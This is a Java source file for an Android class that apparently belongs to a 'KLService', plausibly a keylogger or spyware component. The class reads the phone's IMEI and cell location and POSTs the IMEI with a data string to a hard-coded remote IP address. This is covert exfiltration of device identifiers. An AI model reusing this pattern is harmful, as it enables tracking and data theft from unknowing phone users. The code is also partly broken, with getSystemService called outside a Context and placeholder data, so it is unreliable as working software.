package com.OverFlow.KLService;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class KLSHttpSender {
	private HttpClient mHttpClient;
	private HttpPost mHttpPost;
	private int mDebugLevel;
	TelephonyManager mTelephonyManager;
	GsmCellLocation mGsmCellLocation;
	
	KLSHttpSender() {
		mHttpClient = new DefaultHttpClient();
		mHttpPost = new HttpPost();
		mDebugLevel = KLSDebugLog.getDebugLevel();
		mTelephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		mGsmCellLocation = (GsmCellLocation) mTelephonyManager.getCellLocation();
	}
	
	public void sendData() {
		try {
		    // Add your data
			mHttpPost.setURI(new URI("http://109.253.182.246/process.php"));
		    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
		    nameValuePairs.add(new BasicNameValuePair("IMEI", mTelephonyManager.getDeviceId()));
		    nameValuePairs.add(new BasicNameValuePair("stringdata", "DATADTADATDATTDTTDATDATA"));
		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

		    // Execute HTTP Post Request
		    HttpResponse response = mHttpClient.execute(mHttpPost);

    		if (mDebugLevel > 1) {
    			Log.i(getClass().getSimpleName(), "AVIAD: Response: " + response.toString());
    		}
		} 
		catch(URISyntaxException e) {
    		if (mDebugLevel > 0) {
    			Log.e(getClass().getSimpleName(), "AVIAD: " + e.getMessage());
    		}
		}
		catch (ClientProtocolException e) {
    		if (mDebugLevel > 0) {
    			Log.e(getClass().getSimpleName(), "AVIAD: " + e.getMessage());
    		}
		} 
		catch (IOException e) {
    		if (mDebugLevel > 0) {
    			Log.e(getClass().getSimpleName(), "AVIAD: " + e.getMessage());
    		}
		}
	}
	
}
